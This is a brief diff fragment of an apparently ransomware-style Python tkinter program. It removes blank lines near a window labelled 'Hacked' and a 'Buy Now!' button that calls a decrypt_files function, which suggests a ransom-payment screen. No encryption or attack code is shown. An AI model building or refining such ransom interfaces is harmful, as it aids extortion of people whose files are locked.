@@ -204,11 +204,6 @@ def main():
 
     tk.Label(root, text="Hacked", font=("Arial", 16)).pack(pady=10)
 
-
-    
-   
-
-
     decrypt_button = tk.Button(root, text="Buy Now!", command=decrypt_files, width=20, height=2)
     decrypt_button.pack(pady=10)
 
